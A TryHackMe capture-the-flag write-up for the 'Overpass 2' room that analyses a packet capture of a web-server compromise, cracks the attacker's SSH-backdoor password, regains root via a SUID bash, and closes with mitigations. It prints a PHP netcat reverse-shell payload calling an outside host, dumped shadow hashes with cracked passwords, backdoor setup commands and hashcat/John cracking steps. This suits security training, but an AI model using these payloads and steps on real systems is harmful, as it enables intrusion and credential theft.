# TryHackMe - [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked) Write-Up

"Overpass has been hacked! Can you analyse the attacker's actions and hack back in?"

## Task 1: Forensics - Analyse the PCAP

Let's go ahead and make a directory for this room.

Now, we can download the pcapng file into the directory.

**1) What was the URL of the page they used to upload a reverse shell?**

Let's open Wireshark and drag in the PCAP to investigate what occurred.

You can also use terminal to open the capture as root.

```
sudo wireshark overpass2.pcapng
```

Let's start by following the TCP stream of the first packet.

```
GET /development/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "588-5aae9add656f8-gzip"
```

Now that we know the directory of the URL used by the adversary, we can move on to the next stream.

**2) What payload did the attacker use to gain access?**

Let's start by following the next TCP stream on line 11.

```
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--
```

With this stream we can see they used upload.php to upload their payload, payload.php using netcat.

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

We see a HTTP/1.1 200 OK which means that it was successful.

** 3) What password did the attacker use to privesc?**

Luckily for us, netcat transmits everything in plaintext. So we can actually middleman that password used along with their actions before switching to a more obfuscated shell.

Jump through the streams until you get to one with plaintext commands.

```
tcp.stream eq 3
```

Following this stream, we can see a lot of commands used by the attacker.

```
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@overpass-production:/var/www/html/development/uploads$ ls -lAh
ls -lAh
total 8.0K
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass
cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ su james
su james
Password: whenevernoteartinstant

james@overpass-production:/var/www/html/development/uploads$ cd ~
cd ~
james@overpass-production:~$ sudo -l]
sudo -l]
sudo: invalid option -- ']'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
james@overpass-production:~$ sudo -l
sudo -l
[sudo] password for james: whenevernoteartinstant

Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$ sudo cat /etc/shadow
sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor

<git clone https://github.com/NinjaJc01/ssh-backdoor
Cloning into 'ssh-backdoor'...
remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        
remote: Counting objects:  11% (2/18)        
remote: Counting objects:  16% (3/18)        
remote: Counting objects:  22% (4/18)        
remote: Counting objects:  27% (5/18)        
remote: Counting objects:  33% (6/18)        
remote: Counting objects:  38% (7/18)        
remote: Counting objects:  44% (8/18)        
remote: Counting objects:  50% (9/18)        
remote: Counting objects:  55% (10/18)        
remote: Counting objects:  61% (11/18)        
remote: Counting objects:  66% (12/18)        
remote: Counting objects:  72% (13/18)        
remote: Counting objects:  77% (14/18)        
remote: Counting objects:  83% (15/18)        
remote: Counting objects:  88% (16/18)        
remote: Counting objects:  94% (17/18)        
remote: Counting objects: 100% (18/18)        
remote: Counting objects: 100% (18/18), done.        
remote: Compressing objects:   6% (1/15)        
remote: Compressing objects:  13% (2/15)        
remote: Compressing objects:  20% (3/15)        
remote: Compressing objects:  26% (4/15)        
remote: Compressing objects:  33% (5/15)        
remote: Compressing objects:  40% (6/15)        
remote: Compressing objects:  46% (7/15)        
remote: Compressing objects:  53% (8/15)        
remote: Compressing objects:  60% (9/15)        
remote: Compressing objects:  66% (10/15)        
remote: Compressing objects:  73% (11/15)        
remote: Compressing objects:  80% (12/15)        
remote: Compressing objects:  86% (13/15)        
remote: Compressing objects:  93% (14/15)        
remote: Compressing objects: 100% (15/15)        
remote: Compressing objects: 100% (15/15), done.        
Unpacking objects:   5% (1/18)   
Unpacking objects:  11% (2/18)   
Unpacking objects:  16% (3/18)   
Unpacking objects:  22% (4/18)   
Unpacking objects:  27% (5/18)   
Unpacking objects:  33% (6/18)   
Unpacking objects:  38% (7/18)   
remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0        
Unpacking objects:  44% (8/18)   
Unpacking objects:  50% (9/18)   
Unpacking objects:  55% (10/18)   
Unpacking objects:  61% (11/18)   
Unpacking objects:  66% (12/18)   
Unpacking objects:  72% (13/18)   
Unpacking objects:  77% (14/18)   
Unpacking objects:  83% (15/18)   
Unpacking objects:  88% (16/18)   
Unpacking objects:  94% (17/18)   
Unpacking objects: 100% (18/18)   
Unpacking objects: 100% (18/18), done.
james@overpass-production:~$ cd ssh-backdoor
cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/james/.ssh/id_rsa): id_rsa
id_rsa
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```

We can see in the stream the password used by the attacker to escalate to the user james.

**4) How did the attacker establish persistence?**

We're going to go through these commands and examine exactly what was done by the adversary.

* id

Checks to see what user they are currently and the privileges associated.

* python3 -c 'import pt;pty.spawn("bin/bash")'

They then import the pty module to spawn a more stable bash shell because they have the required permissions.

However, this is still not persistent.

* ls -lAh

The adversary then begins looking for files, including hidden files and their permissions.

* cat .overpass

The . in front of overpass indicates it is a hidden file. They cat it to view the hidden file looking for credentials to escalate privileges.

* su james

It looks like they found a user, you can see they enter the password. These were both likely found in the hidden file. They switch their bash user from www/data to james.

* cd ~

Now that they are user james, they are going to cd to the home directory. The ~ is unnecessary because they could have just used cd for this.

* sudo -l]

Another mistake by the adversary, they were trying to list privileges but added a ]

* sudo -l

Finally, they were able to list privileges of their compromised user james. The adversary learnes here what commands they can now run as root.

```
User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
```

The attacker got lucky here. James has access to all commands.

* sudo cat /etc/shadow

Since they can cat as root, they go and check the volume shadows for hashes to crack.

* git clone https://github.com/NinjaJc01/ssh-backdoor

The attacker now goes on to establish persistence through an [ssh backdoor](https://github.com/NinjaJc01/ssh-backdoor) since they do not need to further escalate privileges.

* cd ssh-backdoor

They navigate to the cloned directory for the backdoor.

* ssh-keygen

They go and generate a new SSH key.

* id_rsa

They setup their identification key and save it.

* chmod +x backdoor

They then make the backdoor executable as root, and can launch it since they have privileges.

* ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

The attacker has established persistence, and runs the ssh backdoor with their desired hash.

** 5) Using the fasttrack wordlist, how many of the system passwords were crackable?**

Now, we should find out which accounts have been compromised by the attacker in the volume shadows.

We can note that the following users returned hashes, hopefully they used secure passwords that cannot be cracked.

* james (compromised by .overpass)
* paradox
* szymex
* bee
* muirland

We can note that these are most likely all SHA512 crypt because they start with **$6$**.

Let's go ahead and run [John the Ripper](https://github.com/openwall/john) along with the fasttrack wordlist on the hashes we received.

```
sudo john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt
```

Unfortunately, every created user has been compromised. We weren't able to fasttrack james, but he was already compromised by the attacker.

```
bee;secret12
szymex;abcd123
muirland;1qaz2wsx
paradox;secuirty3
```

## Task 2: Research - Analyse the code

Now for some fun, lets go ahead and clone that backdoor to our overpass 2 directory we created using the same cloning command as the attacker. Luckily, since its open source on github we won't have to do any reverse engineering.

**Please do not install this backdoor on your personal computer.**

**1) What's the default hash for the backdoor?**

Let's open up the main.go and investigate.

```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

**2) What's the hardcoded salt for the backdoor?**

Continue through the code and we can see there is a string named salt being used.

At the end of the source, we find the hardcoded salt in the passwordHandler function.

```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

**3) What was the hash that the attacker used? - go back to the PCAP for this!**

Earlier, we didn't understand the arguments used in the backdoor when it was executed.

```
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

After analysis of the source we see that it was the hash used by the attacker. We can also see they could've used --hash, but -a seems like the better option for an adversary to avoid giving away what the argument is.

**4) Crack the hash using rockyou and a cracking tool of your choice. What's the password?**

It's time to hack into the adversaries backdoor. We're going to use John with rockyou.txt to do this.

First though, we need to go back to the source and find the function hashPassword to see how the hash is formatted.

```
func hashPassword(password string, salt string) string {
    hash := sha512.Sum512([]byte(password + salt))
    return fmt.Sprintf("%x", hash)
}
```

We can see that it uses the sha512 with the password and then the salt which was hardcoded. 

After seeing the format is formatted differently than normal sha512 due to the salt and hash, I'm actually going to be using [hashcat](https://github.com/hashcat/hashcat). This is because it has a mode for the formatting used [sha512($pass.$salt)](https://hashcat.net/wiki/doku.php?id=example_hashes).

```
hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Using mode 1710, we get a hit on the password.

```
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512($pass.$salt)
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Sun Mar 14 19:28:52 2021, (0 secs)
Time.Estimated...: Sun Mar 14 19:28:52 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   300.1 kH/s (0.77ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 18432/14344385 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: christal -> tanika
```

## Task 3: Attack - Get back in!

"Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!"

**1) The attacker defaced the website. What message did they leave as a heading?

Navigate to the site and view the source.

```html
<h1>H4ck3d by CooctusClan</h1>
```

**2) What's the user flag?**

Alright, now that we've gotten the credentials for the backdoor... let's try to ssh in with them!

```
ssh james@10.10.70.23 -p 2222
The authenticity of host '[10.10.70.23]:2222 ([10.10.70.23]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.70.23]:2222' (RSA) to the list of known hosts.
james@10.10.70.23's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 
```

Now that we've got into the backdoor, let's look around with ls and cd.

Navigate to the home directory to find the user flag (cd ~ or cd).

**3) What's the root flag?**

When I was listing james' home directory, I used ls -a and found a very interesting bash file.

```
ls -a
.              .bash_logout  .gnupg     .profile                   ssh-backdoor                                                                   
..             .bashrc       .local     .sudo_as_admin_successful  user.txt
.bash_history  .cache        .overpass  .suid_bash                 www
```

Let's try to run the bash and see if it escalates us to root.

```
./.suid_bash
.suid_bash-4.4$ whoami
james
.suid_bash-4.4$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
.suid_bash-4.4$ cd /root
.suid_bash: cd: /root: Permission denied
.suid_bash-4.4$ 
```

I tried putting sudo in front of the bash execution, but james' password is not the same as the ssh backdoor or what the password was previously (whenevernoteartinstant).

Unfortunately, we still do not have permissions but this file might be able to escalate us, we need to check if it has the proper SUID.

If we run ls -lah on the home directory, we see that .suid_bash is exactly what we need to get root. It looks like it was implemented by the hacker.

```
-rwsr-sr-x 1 root  root  1.1M Jul 22  2020 .suid_bash
```

After some research, I believe I will be able to exploit this using [GTFOBINs](https://gtfobins.github.io/gtfobins/bash/).

Let's go ahead and run it with -p to carry over the SUID privileges for root.

```
./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# 
```

Owned, let's cd to /root and cat the flag :)

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

First, we've got to take out the way that they got in. You can actually see a note in \development\index.html aknowledging they were warned about this.

```html
<!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->
```

1. Add a login where only admins can upload, and make sure that it cannot be bruteforced.
2. Disallow file extensions that will not be uploaded in uploads.php, it currently allows any file type.

### Privilege Escalation

James should only have have access to run the commands needed as root, not all commands.

Clean the bash in /home/james directory. It has .suid_bash along with .overpass, which were both used for escalation. It also contains the ssh-backdoor.

```
lrwxrwxrwx 1 james james    9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james 3.7K Apr  4  2018 .bashrc
drwx------ 2 james james 4.0K Jul 21  2020 .cache
drwx------ 3 james james 4.0K Jul 21  2020 .gnupg
drwxrwxr-x 3 james james 4.0K Jul 22  2020 .local
-rw------- 1 james james   51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james  807 Apr  4  2018 .profile
-rw-r--r-- 1 james james    0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1.1M Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james 4.0K Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james   38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james 4.0K Jul 21  2020 www

```

### Repairs

Luckily, it looks like there is a backup of the old website in /home/james.

First, we must clean it because it contains the payload and backdoor that were uploaded.

* Go to home/james/html/development/uploads and remove the backdoor and payload.

```
ls -lah
total 6.4M
drwxrwxr-x 2 james james 4.0K Jul 21  2020 .
drwxrwxr-x 3 james james 4.0K Jul 21  2020 ..
-rw-rw-r-- 1 james james 6.4M Jul 20  2020 backdoor
-rw-rw-r-- 1 james james   99 Jul 20  2020 payload.php
```

* Make sure you have updated before swapping in the backup with a login so that the hacker cannot get another shell on the server.

* Go to /var/www/html and replace the files with the backup in /home/james/www/ after you have cleaned it of the payload and backdoors.


Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
